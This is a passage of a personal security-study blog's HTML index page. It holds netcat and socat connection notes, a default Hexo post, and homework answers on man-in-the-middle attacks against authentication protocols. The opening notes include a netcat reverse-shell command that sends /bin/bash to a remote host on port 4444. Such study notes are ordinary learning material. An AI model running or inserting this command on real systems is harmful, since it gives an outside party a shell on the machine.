<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.230.10 4444 -e /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">reverse,送上门被控制</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="3-1-2-socat"><a href="#3-1-2-socat" class="headerlink" title="3.1.2 socat"></a>3.1.2 socat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#socat - TCP4:XXX.XXX.XXX.XXX:XXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client1/LINUX</span><br><span class="line">sudo socat TCP4-LISTEN:443 STDOUT</span><br><span class="line"><span class="meta">#</span><span class="bash">socat TCP4-LISTEN:443 STDOUT</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client2/Windows</span><br><span class="line">sudo socat - TCP4:192.168.119.230:443</span><br></pre></td></tr></table></figure>

<p>After the construction of connection, we could communicate.</p>
<h1 id="9-Tag-0x09"><a href="#9-Tag-0x09" class="headerlink" title="9. Tag 0x09"></a>9. Tag 0x09</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/13/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-13T13:24:10+02:00">
                2020-05-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hello-World/" itemprop="url" rel="index">
                    <span itemprop="name">Hello World</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/12/Leviathan01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/12/Leviathan01/" itemprop="url">buu_pwn</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-12T17:45:54+02:00">
                2020-05-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="test-your-nc-1"><a href="#test-your-nc-1" class="headerlink" title="test_your_nc 1"></a>test_your_nc 1</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/07/SP/Submission0_archive/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/07/SP/Submission0_archive/" itemprop="url">submission0_sp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-07T10:44:09+02:00">
                2020-05-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/theory/" itemprop="url" rel="index">
                    <span itemprop="name">theory</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Homework0-for-the-Security-and-Privacy"><a href="#Homework0-for-the-Security-and-Privacy" class="headerlink" title="Homework0 for the Security and Privacy"></a>Homework0 for the Security and Privacy</h2><p> <img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-14_i3k5op.png" alt=""></p>
<p>==P2 Answers a:==</p>
<ul>
<li>A will notice that the message was not created by E, as she expects, but rather by B.</li>
<li>Thus A aborts the protocol</li>
<li>Hence E never sees the nouce $$N_B$$</li>
<li>Without $N_B$, E is not able to impersonate A to B</li>
</ul>
<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200426195732988.png" alt="image-20200426195732988"></p>
<p>==P2 Answer b==:</p>
<ul>
<li><p>Possible Attach on NSL if A use a nonce twice</p>
</li>
<li><p>assumption in session 1 : A and  E communicate both honestly, E have captured $$N_A$$</p>
</li>
<li><p>In session 2 : </p>
<ol>
<li><p>A &gt;&gt; E : $${N_A, A}^a_{kB}$$               </p>
<blockquote>
<p>​    A  use the same $N_A$ </p>
</blockquote>
</li>
<li><p>E &gt;&gt; A : $${N_A, N’<em>E, B}^a</em>{kA} $$           </p>
<blockquote>
<p> E is able to encrypt the $N_A$ due to it is the same</p>
</blockquote>
</li>
<li><p>A &gt;&gt; E : $${N’<em>E}‘</em>{kB}$$        </p>
<blockquote>
<p>Although E dont hold the private key of B, but the $N’_E$ is known for E, because this message is that E sent it to A!</p>
</blockquote>
</li>
</ol>
</li>
</ul>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-23_tqezhv.png" alt=""></p>
<p>==P3 Answer==:</p>
<p>we should assume that the </p>
<ol>
<li>attacker does not know the key!!</li>
<li>$N_A$ might be sent by A before!! So E knew the NA before</li>
</ol>
<blockquote>
<ul>
<li><p>With shared key and without the identification, protocol above is easy to be attacked by Man-in-the-middle attack. For example:</p>
<ol>
<li><p>$$A \rightarrow E : {N_A}^s_k$$</p>
</li>
<li><p>$$E \rightarrow B : {N_A}^s_k$$</p>
</li>
<li><p>$$B \rightarrow E : {N_B}^s_k, N_A$$</p>
</li>
<li><p>$$E \rightarrow A : {N_B}^s_k, N_A$$</p>
</li>
<li><p>$$A \rightarrow E : N_B$$</p>
</li>
<li><p>$$E \rightarrow B : N_B$$</p>
</li>
</ol>
</li>
<li><p>Adversary Eve just interpreted the messages between Alice and Bob, Alick thought she set up a session with Bob, but it is from the Eve who impersonate the Bob, the other way around as Bob, He set up a fake session with Eve as well, additionally the both Nonces are not encrypted. So authentication is violated.</p>
</li>
</ul>
</blockquote>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588942650/Screenshot_from_2020-05-08_14-57-21_jd0hta.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-32_fgg8lw.png" alt=""></p>
<p>==P4 Answer:==</p>
<p>The essential of attack is to take use the fourth step, in precise to construct a suitable message, take the output from B in 2nd session, then sent it to B in 1st session.</p>
<p>Below is the message flow:</p>
<p>1.1.    $I(A) -&gt;  B :   A ,B$</p>
<p>1.2.     $B -&gt;  I(A) :   B ,N_{B1}$</p>
<p>1.3.     $ I(A) -&gt;  B :   Random-string$</p>
<p>1.4.    $B -&gt; I(S) :Random - string, { A,B,B,N_{B_1} }^s_{Kbs}$</p>
<p>2.1.     $I(A) -&gt;  B :   A ,N_{B1}$</p>
<p>2.2.     $B -&gt;  I(A) :   B ,N_{B2}$</p>
<p>2.3.     $I(A) - &gt; B:Random-string$</p>
<p>2.4.    $B -&gt; I(S) :Random - string, { A,B,N_{B_1},N_{B_2}}^s_{Kbs}$</p>
<p>1.5.    $I(S) -&gt; B :Random - string, { A,B,N_{B_1},N_{B_2}}^s_{Kbs}$</p>
<p>1.6.    $B -&gt; I(A) :Random - string, { B, N_{B_1}}N_{B_2}$</p>
<p>1.7.    $I(A) -&gt; B :{N_{B_1}}N_{B_2}$</p>
<p>Furthermore:<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588942709/Screenshot_from_2020-05-08_14-58-21_auvhpq.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.JPG"
                alt="Seven ♂" />
            
              <p class="site-author-name" itemprop="name">Seven ♂</p>
              <p class="site-description motion-element" itemprop="description">Try harder</p>
          </div>

	<div id="music163player">
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=120 src="//music.163.com/outchain/player?type=0&id=5004636762&auto=0&height=430"></iframe>
	</div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/FastG0at" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:st164478@stud.uni-stuttgart.de" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Seven ♂</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    

    

  




	





  














  





  

  

  

  
  

  

  

  

</body>
</html>
